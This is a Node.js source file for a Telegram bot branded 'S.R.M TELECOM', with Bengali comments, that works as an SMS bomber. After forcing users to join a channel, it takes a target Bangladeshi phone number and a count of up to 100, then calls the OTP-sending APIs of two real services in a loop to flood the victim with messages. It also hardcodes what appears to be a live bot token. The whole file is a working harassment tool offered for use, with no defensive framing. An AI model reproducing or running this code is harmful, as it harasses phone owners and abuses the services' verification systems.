const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const channelId = '@srmtelecom'; // আপনার চ্যানেলের ইউজারনেম
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render Fix: সার্ভার সচল রাখার জন্য
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Bot is Running!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Force Join & Keyboard Mode) চালু হয়েছে...");

// মেনু বাটনগুলো (কিবোর্ডের নিচে থাকবে)
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 SMS Attack শুরু' }],
            [{ text: '📢 আমাদের চ্যানেল' }, { text: 'ℹ️ আমাদের সম্পর্কে' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// চ্যানেল জয়েন চেক করার ফাংশন
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) {
        return false;
    }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return;

    // ১. চ্যানেল জয়েন চেক (Force Join)
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `⚠️ **অ্যাক্সেস ডিনাইড!**\n\nআপনি আমাদের চ্যানেলে জয়েন করেননি। বটটি ব্যবহার করতে চাইলে আগে জয়েন করুন।\n\n📢 চ্যানেল: ${channelLink}\n\nজয়েন করার পর আবার /start দিন।`, { parse_mode: "Markdown" });
    }

    // ২. স্টার্ট কমান্ড
    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM বোম্বার বটে স্বাগতম!**\nনিচের বাটনগুলো ব্যবহার করে কাজ শুরু করুন।", mainMenu);
    }

    // ৩. বাটন হ্যান্ডলার
    else if (text === '🚀 SMS Attack শুরু') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    else if (text === '📢 আমাদের চ্যানেল') {
        bot.sendMessage(chatId, `আমাদের অফিশিয়াল চ্যানেল: ${channelLink}`);
    }

    // ৪. বোম্বিং প্রসেস
    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)**`);
        } else {
            bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।");
        }
    } 
    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 100) return bot.sendMessage(chatId, "⚠️ ১-১০০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু হয়েছে...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            try {
                // মাল্টিপল এপিআই ট্রাই করবে
                await axios.post('https://fundesh.com.bd/api/auth/send-otp', { msisdn: target });
                success++;
            } catch (e) {
                try {
                    await axios.post('https://toffeelive.com/api/v1/auth/send-otp', { phone: "88" + target });
                    success++;
                } catch (err) {}
            }
            await new Promise(r => setTimeout(r, 1500));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success}টি`, mainMenu);
    }
});
